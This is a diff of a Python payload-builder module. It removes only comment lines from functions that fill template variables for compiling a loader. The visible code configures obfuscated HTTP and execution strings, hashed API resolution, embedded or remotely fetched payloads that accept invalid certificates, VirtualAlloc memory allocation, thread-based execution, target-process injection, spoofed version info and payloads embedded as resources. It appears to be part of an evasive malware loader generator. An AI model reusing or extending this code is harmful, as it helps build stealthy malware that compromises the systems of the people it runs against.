@@ -66,7 +66,6 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
     """Prepares the complete dictionary of variables to be passed to the Jinja2 template."""
     template_vars = {}
     
-    # 1. Determine Global and Local Obfuscation Flags
     obfuscate_http_strings = options.get('obfuscate_http_strings') == 'true'
     obfuscate_execution_strings = options.get('obfuscate_execution_strings') == 'true'
     
@@ -77,14 +76,12 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
         key = random.randint(1, 255)
         template_vars['obfuscation_key'] = key
 
-    # 2. API Resolver Context
     api_resolver_choice = options.get('api_resolver', 'string')
     template_vars['api_resolver'] = api_resolver_choice
     template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
     if api_resolver_choice == 'hashed':
         template_vars.update(_get_api_hashes())
 
-    # 3. Data Source Context
     data_source_choice = options.get('data_source', 'embedded')
     template_vars['data_source'] = data_source_choice
     if data_source_choice == 'embedded':
@@ -110,7 +107,6 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
             template_vars['user_agent'] = user_agent
         template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
 
-    # 4. General Options
     output_format = options.get('output_format', 'exe')
     allocation_method_choice = options.get('allocation_method', 'virtualalloc')
     execution_method_choice = options.get('execution_method', 'newthread')
@@ -135,7 +131,6 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
         else:
             template_vars['target_process'] = target_process
     
-    # 5. Version Info Logic
     template_vars['version_info_mode'] = 'none' 
     selected_template_name = options.get('version_info_template_select')
     
@@ -217,7 +212,6 @@ def _compile_payload_resources(payload_bytes, temp_files_to_clean):
     temp_rc_filename = f"{uuid.uuid4()}_payload.rc"
     temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
     temp_files_to_clean.append(temp_rc_filepath)
-    # Write as simple ASCII
     with open(temp_rc_filepath, "w", encoding="ascii") as f_rc:
         f_rc.write(rc_content_payload)
 
